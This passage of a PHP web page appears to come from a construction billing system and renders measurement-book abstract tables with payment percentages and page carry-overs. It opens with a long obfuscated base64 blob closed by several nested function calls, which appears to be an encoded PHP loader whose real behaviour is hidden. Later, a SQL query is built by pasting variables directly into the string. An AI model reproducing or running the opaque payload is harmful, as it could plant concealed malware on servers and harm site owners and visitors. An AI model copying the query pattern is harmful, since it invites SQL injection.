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')))));

//echo $subdivname." = ".$Line." = ".$LineTemp." = ".$Linecheck."<br/>";
if($LineTemp >= 34){ $Line = 34; $LineTemp = 0; }
if($Line >= 34)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td><?php //echo $LineTemp; ?></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td><?php //echo $LineIncr."*".$Linecheck; ?></td>
</tr>
<?php
$Line = $LineIncr+$Linecheck; $page++;
}
//--*************THIS PART IS FOR " PRINT " Item Name, Description and Check Box  SECTION********************//
?>
<input type="hidden" name="hid_item_str" id="hid_item_str<?php echo $subdivid; ?>" value="<?php echo $item_str; ?>" />
<tr border='1' bgcolor="" class="labelprint">
	<td width="61px" align="center" style="border-top-color:#666666;" class="">
		<?php echo $subdivname;?>
	</td>
	<td colspan="8" style="border-top-color:#666666;" class="">
		<?php echo $description; ?>
	</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $slm_cnt."**".$dpm_cnt; ?>&nbsp;</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
</tr>
<?php 
$rowcount++; $Line++;//echo "A = ".$Line."<br/>";
// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page);  $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>"; }
//--*************THIS PART IS FOR " PRINT " DEDUCT PREVIOUS MEASUREMENT ( D.P.M. ) SECTION*****************//
	$QtyDpmSlm_4 = 0;	$PercDpmSlm_4 = 0;	$Dpm_Slm_Amount_4 = 0;	$total_percent_dpm_slm_4 = 0;
	$QtyDpmSlm_3 = 0;	$PercDpmSlm_3 = 0;	$Dpm_Slm_Amount_3 = 0;	$total_percent_dpm_slm_3 = 0;
	$QtyDpmSlm_2 = 0;	$PercDpmSlm_2 = 0;	$Dpm_Slm_Amount_2 = 0;	$total_percent_dpm_slm_2 = 0;
	$QtyDpmSlm_1 = 0;	$PercDpmSlm_1 = 0;	$Dpm_Slm_Amount_1 = 0;	$total_percent_dpm_slm_1 = 0;

	if($dpm_cnt > 0)
	{
		$eplodedpm = explode("*", rtrim($dpm_mesurementbook_details,"*"));
		//echo "D = ".count($eplodedpm)."<br/>";
		 $DpmTemp = 0;
		for($x4=0; $x4<count($eplodedpm); $x4+=13)
		{
			$dpmqty 				= $eplodedpm[$x4+1];
			$remarks 				= $eplodedpm[$x4+10];
			$rbnDpm					= $eplodedpm[$x4+11];
			$MeasurementbookidDpm	= $eplodedpm[$x4+12];
			$paymentpercent_dpm 	= $eplodedpm[$x4+7];
			$dpmamt 				= $dpmqty * $rate * $paymentpercent_dpm / 100;
			$dummy=0;
			if(in_array($MeasurementbookidDpm, $DpmArrMbidList)) 
			{
				$ArrUniqueVal 	= array_unique($DpmArrMbidList);
				$UniqueCount 	= count($ArrUniqueVal);
				$x6=0;
				$count_1 		= count($DpmArrAmbList);
				$count_2 		= count($DpmArrAmbPgList);
				$AMBookNo 		= $DpmArrAmbList[$count_1-1];
				$AMBookPage 	= $DpmArrAmbList[$count_2-1];
				while($x6<=$UniqueCount)
				{
					$StartKey = $ArrUniqueVal[$x6];
					$PaidDpmPerc = $DpmArrPercent[$StartKey];
					$rowspancnt = $UniqueCount+$DpmTemp;
					$DpmKeyresult = checkPartpayment($DpmArrMbidList,$StartKey);
					$DpmPercSum = $PaidDpmPerc;
					if($DpmKeyresult != "")
					{
						$explodeDpmKeyresult = explode("*",$DpmKeyresult);
						for($x7=0; $x7<count($explodeDpmKeyresult); $x7++)
						{
							$key = $explodeDpmKeyresult[$x7];
							$DpmPercSum = $DpmPercSum + $DpmArrPayPercentList[$key];
						}
						if(($x6 == 0)&&($DpmTemp == 0))
						{
						$DpmQuantityty_1 = $DpmArrQuantityList[$key];
						$DpmAmount_1 = $DpmQuantityty_1 * $rate * $DpmPercSum /100;
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_1 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_1 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_1 = $QtyDpmSlm_1 * $PercDpmSlm_1 * $rate/100;
							}
						$total_percent_dpm_slm_1 = $DpmPercSum+$PercDpmSlm_1;
						
?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<td  align='center' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' width='180px' class='' rowspan="<?php echo $rowspancnt; ?>" style="font-size:10px;"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"></td>
						<td  align='right' width='' class=''><?php echo $QtyDpmSlm_1; ?></td>
						<td  align='right' width='' class=''>
							<?php 
							echo number_format($DpmAmount_1, 2, '.', '');
							$dpm_amount_item 		= $dpm_amount_item + $DpmAmount_1;
							?>
						</td>
						<td  align='right' width='6%' class='' rowspan=""></td>
						<td  align='right' width='3%' class='' rowspan="">
							<?php
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_1, 2, '.', ''); 
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_1;
							} 
							?>
						</td>
						<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
							<?php 
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo $total_percent_dpm_slm_1."% Paid"; 
							}
							?>
						</td>
					</tr>

<?php					$rowcount++;	
						}
						
						else
						{
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_2 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_2 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_2 = $QtyDpmSlm_2 * $PercDpmSlm_2 * $rate/100;
								$total_percent_dpm_slm_2 = $DpmPercSum+$PercDpmSlm_2;
								
							}
							else
							{
								$QtyDpm_5 = $DpmArrQuantityList[$key];
								$Dpm_Slm_Amount_2 = $QtyDpm_5 * 100 * $rate/100;
							}
?>
							<tr border='1' bgcolor="#FFFFFF" class="labelprint">
								<td  align='right' width='' class=''><?php echo $DpmArrQuantityList[$key]; ?></td>
								<td  align='right' width='' class=''><?php echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); $dpm_amount_item = $dpm_amount_item + $Dpm_Slm_Amount_2; ?></td>
								<td  align='right' width='' class=''></td>
								<td  align='right' width='' class=''>
									<?php
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
										$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_2;
									} 
									?>
								</td>
								<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
									<?php 
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo $total_percent_dpm_slm_2."% Paid"; 
									}
									?>
								</td>
							</tr>
		<?php				$rowcount++;		
						}
						
					}
					$DpmArrMbidList = removeArray($DpmKeyresult,$DpmArrMbidList);
					$x6++;	
					array_push($temp_array,$StartKey);
				}
				//$Line = $Line + $rowspancnt;//echo "B = ".$rowspancnt."<br/>";
				// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>";}
			}
							//********** THIS PART IS FOR NOW PAYING (SLM) - DEDUCT PREVIOUS MEASUREMENT **********//
			$PercDpmSlm_3 = 0; 	$Dpm_Slm_Amount_4 = 0;		
			if(in_array($MeasurementbookidDpm, $temp_array))
			{
				$dummy = 1;
			}
			else
			{
				if($x4 == 0)
				{ 
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_3 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_3 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_3 = $QtyDpmSlm_3 * $PercDpmSlm_3 * $rate /100;
					}
					$total_percent_dpm_slm_3 = $paymentpercent_dpm + $PercDpmSlm_3;
?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<!--<td  align='left' width='3%' class=''>&nbsp;</td>-->
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $dpm_cnt; ?>"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
						<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' width='' class=''>
							<?php 
								echo number_format($dpmqty, $decimal, '.', ''); 
							?>
						</td>
						<td  align='right' width='' class=''>
							<?php 
								echo number_format($dpmamt, 2, '.', ''); 
								$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
							?>
						</td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>"></td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>">
							<?php 
							if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_3, 2, '.', '');
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_3;
							}
							?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php 
								echo $total_percent_dpm_slm_3."% Paid"; 
							?>
						</td>
					</tr>	
<?php 			$rowcount++;
				}
				if(($dpm_cnt > 1) && ($x4 != 0))
				{
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_4 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_4 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_4 = $QtyDpmSlm_4 * $PercDpmSlm_4 * $rate /100;
					}
					$total_percent_dpm_slm_4 = $paymentpercent_dpm + $PercDpmSlm_4;
?>
				<tr border='1' bgcolor="#FFFFFF" class="labelprint">
					<td  align='right' width='' class=''><?php echo number_format($dpmqty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo number_format($dpmamt, 2, '.', ''); $dpm_amount_item  = $dpm_amount_item + $dpmamt; ?></td>
					<?php 
					if($dummy == 0) 
					{
					?>
						<td  align='right' width='' class=''></td>
						<td  align='right' width='' class=''>
							<?php 
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_4, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_4;
								}
							 ?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php
								//if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								//{
									echo $total_percent_dpm_slm_4."% Paid";
								//}
							?>
						</td>
					<?php 
					} 
					?>
				</tr>
<?php	
				$rowcount++;
				}
			}
			//$Line = $Line + $dpm_cnt;//echo "C = ".$dpm_cnt."<br/>";
			// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
			$DpmTemp++; 
		}
		//$rowcount++;
	}
//*************THIS PART IS FOR " PRINT " ---- SINCE LAST MEASUREMENT ( S.L.M. ) SECTION*******************//
?>
<?php
	$slm_dpm_str = $slm_measurement_qty."*".$dpm_measurement_qty;
	$mbooktype_query = "select flag from mbookgenerate WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
	$mbooktype_sql = mysql_query($mbooktype_query);
	$flagtype = @mysql_result($mbooktype_sql,0,'flag');
	if($flagtype == 1) { $mbookdescription = "/General MB No. "; }
	if($flagtype == 2) { $mbookdescription = "/Steel MB No. "; }

	if($slm_cnt > 0)
	{
		$eplodeslm = explode("*", rtrim($slm_mesurementbook_details,"*"));
		//echo "B = ".count($eplodeslm)."<br/>";
		for($x3=0; $x3<count($eplodeslm); $x3+=12)
		{
			$slmqty = $eplodeslm[$x3+1];
			
			$remarks = $eplodeslm[$x3+10];
			$paymentpercent = $eplodeslm[$x3+7];
			$slmamt = $slmqty * $rate * $paymentpercent / 100;
			$slm_amount_item = $slm_amount_item + $slmamt;
			if($x3 == 0)
			{
?>
		<tr border='1' bgcolor="#FFFFFF" class="labelprint">
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $slm_cnt; ?>"><?php echo "Qty Vide P ".$mbpageno_slm.$mbookdescription.$mbookno_slm; ?></td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?></td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmqty, $decimal, '.', ''); 
				?>
			</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmamt, 2, '.', ''); 
				?>
			</td>
			<td  align='center' width='' class='' style="font-size:9px;">
				<?php 
					echo $paymentpercent."% Paid"; 
				?>
			</td>
		</tr>
<?php
			}
			if(($slm_cnt > 1) && ($x3 != 0))
			{
			
?>
		<tr border='1' bgcolor="#FFFFFF" class="labelprint">
			<td  align='right' width='' class=''><?php echo number_format($slmqty, $decimal, '.', ''); ?></td>
			<td  align='right' width='' class=''><?php echo number_format($slmamt, 2, '.', ''); ?></td>
			<td  align='center' width='' class='' style="font-size:9px;"><?php echo $paymentpercent."% Paid"; ?></td>
		</tr>
<?php
			$rowcount++;
			}
		}
	$rowcount++; //$Line = $Line + $slm_cnt;//echo "C = ".$slm_cnt."<br/>";
	 //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
	}
	if($PartPayremarks != "")
	{
?>
		<tr border='1' class="labelprint" style="font-size:10px;">
			<td colspan="12" align="left" bgcolor="">Remarks &nbsp; :&nbsp;&nbsp;&nbsp;  <?php echo $PartPayremarks; ?></td>
		</tr>
<?php	
		$rowcount++; $Line++;//echo "E = ".$Line."<br/>";
		// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
	}	
//*************THIS PART IS FOR " PRINT " ---- TOTAL PART ( S.L.M. + D.P.M ) SECTION*******************//	
$total_qty_item = $dpm_measurement_qty + $slm_measurement_qty;
$total_amt_item = $slm_amount_item + $dpm_amount_item;
?>
	<tr border='1' class="labelprint" bgcolor="">
